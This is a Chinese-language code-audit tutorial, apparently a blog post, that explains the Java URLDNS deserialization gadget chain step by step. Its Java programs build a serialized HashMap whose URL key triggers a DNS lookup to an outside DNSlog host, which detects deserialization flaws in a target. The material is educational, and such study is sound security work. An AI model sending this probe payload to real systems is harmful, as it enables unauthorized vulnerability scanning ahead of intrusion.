---
title: 【代码审计】URLDNS链
url: https://mp.weixin.qq.com/s/rItnutpXV9OVK_FOQmwozQ
source: Doonsec's feed
date: 2026-06-20
fetch_date: 2026-06-21T06:47:12.294833
---

# 【代码审计】URLDNS链

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ocg1gpicEs1tKJ31aZkvsYckib2E3xcFofRqeQ2NhKeWcxEGZXZ6vXJ3Q3beNoHYR3Ziar7WYkib1YTibQnbQZvcnMGZUpia4uRluj4JWia7KY4cAQ/0?wx_fmt=jpeg)

# 【代码审计】URLDNS链

原创

十月的进阶之路
十月的进阶之路

十月的进阶之路

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> 花有重开日，人无再少年

本文介绍`URLDNS`链，该链常用于检测是否存在反序列化漏洞，并且该链具备一些非常好的特点，包括：

1. 该链使用`java.net.URL`、`java.util.HashMap`等`jdk`内置的类，没有第三方依赖的要求；
2. 如果目标不存在回显，则可以通过是否发起来了`DNS`解析来检测是否存在反序列化漏洞；
3. 一般而言，该链只用于探测是否存在反序列化漏洞，无法直接`RCE`；

依旧开始调试，我们知道我们的目的是通过发起`DNS`解析请求来分析是否存在漏洞，那么这个链最终肯定是需要进入`URL`相关类的相关方法中进行处理。我们从`URLStreamHandler#getHostAddress`这个方法开始分析，`getHostAddress`内部调用了`InetAddress.getByName()`，这才是真正发出`DNS`请求的系统调用，`getHostAddress`是距离`DNS`触发最近的`Java`层方法，因此以`getHostAddress`方法作为分析的起点。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ocg1gpicEs1uwgBENIK5VRqdGYfcFmhxH6cK6DscoUzRmlhCV4VRwPjQhOTySBCJBiaMWoFp7RPrf36oeDJQRic66vRvWic9pIaI9E5sf8V0V0g/640?wx_fmt=png&from=appmsg)

继续分析`getHostAddress`方法的上层引用。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ocg1gpicEs1vapPLGgRlljfDjuWIARtde7EA6YOICg5PqYver5EMTKNQZPG9xFB5VO5r1SnzlKug86biaUVvuS2jIiaWBo5A6FOW7jqE6pAXNY/640?wx_fmt=png&from=appmsg)

进入`URLStreamHandler#hashCode`方法。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ocg1gpicEs1t9xORIWwXPZSmBMb8YHIorwRF9E41hNS3ArUDlia0hkwb31xrsviafcb3rKYUTwuf0hiaDfCHtW3iaavHLUDUTL7HpXagliceykbuo/640?wx_fmt=png&from=appmsg)

继续分析`hashCode`方法的上层引用。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ocg1gpicEs1utW2icQcNq6Zf6iaeTyfCydJCnjAbPXY0DjpibA89pO8Eiatk1OQn5IDLKeY1bGUrbw9BMlboE7LeiaRFbtweovugjeaCNCZtQH4YE/640?wx_fmt=png&from=appmsg)

进入`URL#hashCode`方法，因此通过这段链发现，只需要声明一个`URL`实例，并调用该实例的`hashCode`方法即可触发`DNS`解析请求，因此编写如下测试代码。

```
package org.example;

import java.net.MalformedURLException;
import java.net.URL;

public class Main {
    public static void main(String[] args) throws MalformedURLException {

        URL url = new URL("http://838ba6ba51.ddns.1433.eu.org.");
        System.out.println(url.hashCode());
    }
}
```

断点调试证明这个过程。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ocg1gpicEs1uCVibqTpgNMviaBUPbbhzCrwOtfWN7xpyV0JjkxU74CHRExLgpUUMCeeMzBtQ1fmTB7E3JUR10icH0IUYgKBOjL9Pg1nzcYapajs/640?wx_fmt=png&from=appmsg)

步过发起`DNS`解析请求。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ocg1gpicEs1vzsPrpVXkF6sQV1mIvQ5bMGx3R1HMibM4UzkrhTj40SWicUvH4yXLNW1JoDZMnTqa5XEWMW7Fa5ZBYVhRRic19NWQJoggpbP5F9Q/640?wx_fmt=png&from=appmsg)

到此为止我们知道`URL`实例的`hashCode`方法会发起`DNS`解析请求，我们继续查找对应的引用，分析在哪里有可能调用这个`hashCode`方法，进而触发`URLDNS`链。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ocg1gpicEs1sZc9EvMh5Bjd6ue4Vv0qWY3RIibdp0zeUJTCPGxnwN7N87TWNmCDeicz8FdgbyUUuxoWamOfpJpiaIThy5czM7SAT20ib9ibBNiaqxM/640?wx_fmt=png&from=appmsg)

通过检索`hashCode`方法的相关引用进入到`HashMap#hash`方法，发现在该方法中调用了`hashCode`方法，因此可以继续修改测试代码。

```
package org.example;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class Main {
    public static void main(String[] args) throws MalformedURLException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {

        URL url = new URL("http://838ba6ba51.ddns.1433.eu.org.");

        Method hash = HashMap.class.getDeclaredMethod("hash", Object.class);
        hash.setAccessible(true);
        hash.invoke(null,url);

    }
}
```

测试发现触发了`DNS`解析请求。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ocg1gpicEs1u4E7rwMnicLm2PBaQXMaXH9MebVibPfwW52cBNZ69OYHc6JqFcJReXbfMEA6C8wo1hEpqWmEglK4n8K0PeSicB6icpUiclJhCV93E0/640?wx_fmt=png&from=appmsg)

继续检索`HashMap#hash`方法的上层引用，进入`HashMap#readObject`方法，这就是我们要找的终点。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ocg1gpicEs1t4fNWNlIBduck4tU2vtwPFfqA74Wr7bVC0jpIGdW5ib1iaHd6xAY8RCnR3azHdZNZfZgmic2a3GrmHtpn6IicnLyMMWGMDVgicLicvg/640?wx_fmt=png&from=appmsg)

也就是只需要将`HashMap`的实例中添加`URL`实例作为`key`即可触发`URLDNS`链条，编写如下测试代码。

```
package org.example;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.concurrent.ExecutionException;

public class Main {
    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, NoSuchFieldException {

        URL url = new URL("http://d40eaafdd1.ddns.1433.eu.org.");

        HashMap<URL,String> map = new HashMap<>();
        map.put(url,"test");

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(map);
        oos.close();

        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();
        ois.close();

    }
}
```

然后通过调试分析，你发现上述代码在`map.put(url,"test")`直接触发了`DNS`解析。

|  |  |
| --- | --- |
| ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ocg1gpicEs1u8neTWR9jlJuXrrlClHC5xiagFbuliaX6QxVZOCEIiao1yJ1rtC9trTK2Ugiaj0AFgj8Ribu12tib7loreclnibv2pDHQCYeUHhp8VcI/640?wx_fmt=png&from=appmsg) | ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ocg1gpicEs1t2T0nlZuoVrUforwHVNAUYlpV5niag4uzTM8ib7ZH6H3OnTbFyzjjtc9nkM0ViaMVeLjibgoh8D2CesR67W7xzLUTwPVDAXgBmiaCY/640?wx_fmt=png&from=appmsg) |

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ocg1gpicEs1v4vmsQN9wiaIEQ7euuibHHMKnnxblISjYlLb4qmVERFZ5nibf2D5tbs4MdcrSm7RSTTa5MHArVsMmGvOd6TvWu84icEjNLzdEmWpM/640?wx_fmt=png&from=appmsg)

而反序列化的过程由于`hashCode`不等于`-1`被直接跳过。`URL.hashCode()`有一个缓存机制，当`hashCode!=-1`时直接返回缓存值，不再调用`handler.hashCode(this)`，因此不会触发`DNS`。`map.put()`时会调用一次`hash(key)`，此时若`hashCode==-1`就会提前触发`DNS`并将计算结果缓存下来（值不再是`-1`），导致反序列化时因缓存命中而跳过`DNS`触发。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ocg1gpicEs1tgvf3qOxpal3SRsg8ibfzS6cfczUOYVibPRBhm89PtHcRgx1JiboTacVy5KhLxu3U1uHCiaxAu05WxGQO7HzmGjGG8ia1sJIsDibVjY/640?wx_fmt=png&from=appmsg)

因此我们需要通过反射将`hashCode`设置为非`-1`避免在`map.put`时触发解析，同时在序列化之前重新设置`hashCode`为`-1`使得目标在反序列化时触发`DNS`的解析，修改代码如下。

```
package org.example;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.concurrent.ExecutionException;

public class Main {
    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, NoSuchFieldException {

        URL url = new URL("http://4f0ccacc93.ddns.1433.eu.org.");
        Field hashCodeField = url.getClass().getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url, 1);

        HashMap<URL,String> map = new HashMap<>();
        map.put(url,"test");

hashCodeField.set(url, -1);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(map);
        oos.close();

        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();
        ois.close();

    }
}
```

断点在`ois.readObject()`处。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ocg1gpicEs1s6XVrReyjmics0QzgdU2oQoJPFHnyl7TKD4HaiajvrZialTHicsTy3J3NEc4bxoRfiaB1IkmwxZysB9QuYv4Eo5IXa2MosUjtoiaiclQ/640?wx_fmt=png&from=appmsg)未发现发起`DNS`解析请求。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ocg1gpicEs1tHKtcFrZEWyHuGiaOrfzIm1aTdl3OWKUDicobLicJerwRJOfico7De6bich3yCPezY6ebYjgWicc97bEg3zQ6QFiafKiaeEqcM49Orrl4/640?wx_fmt=png&from=appmsg)

继续放掉。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ocg1gpicEs1vFt75CkDGltMvcfVc63ucttU940ictHBgaBu20wVia01yOibxeUX5giaZmoTb4RicObVlS3bLbE04HQPicDpggz3yv5CCzAHL7sSwXA/640?wx_fmt=png&from=appmsg)

`hashCode`此时为`-1`，进入后续逻辑以及`DNS`解析。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ocg1gpicEs1uhG5H58diabPSmzj4LT38g7e5f94oGljxbEAyQ3hs38JRFrgKoEw6cKlkK7P9uZKiaTw6VnMhMmuSFibbzcicFzXr6z8iciaorwUhibE/640?wx_fmt=png&from=appmsg...